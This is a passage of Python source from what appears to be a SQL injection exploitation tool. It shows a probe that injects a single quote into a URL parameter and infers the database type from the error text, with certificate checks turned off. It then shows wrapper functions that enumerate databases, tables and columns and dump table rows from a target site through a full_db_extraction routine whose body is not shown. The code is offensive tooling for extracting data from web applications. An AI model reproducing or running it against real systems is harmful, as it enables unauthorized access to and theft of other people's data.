        qs[p] = (qs.get(p, "1")) + "'"
        r = _r.get(url.split("?")[0], params=qs, timeout=8, verify=False,
                   headers={"User-Agent": UA})
        return _detect_db_from_error(r.text)
    except Exception:
        return "MySQL"


def get_databases(url, param, db_type=None, num_columns=2, callback=None):
    r = full_db_extraction(url, param=param, mode="enum", callback=callback)
    return r.get("databases", [])


def get_tables(url, param, database=None, db_type=None, num_columns=2, callback=None):
    r = full_db_extraction(url, param=param, mode="enum", callback=callback)
    return r.get("tables", [])


def get_columns(url, param, table, database=None, db_type=None, num_columns=2, callback=None):
    r = full_db_extraction(url, param=param, mode="dump",
                           target_table=table, callback=callback)
    return r.get("columns", {}).get(table, [])


def dump_table(url, param, table, columns, limit=20, database=None,
               db_type=None, num_columns=2, callback=None):
    r = full_db_extraction(url, param=param, mode="dump",
                           target_table=table, callback=callback)
    return r.get("dump", {}).get(table, [])


def test_sql_injection(url, param=None, method="GET", callback=None):
    """Simple wrapper for basic scan step"""
    return full_db_extraction(url, param=param, method=method,
                              mode="basic", callback=callback)
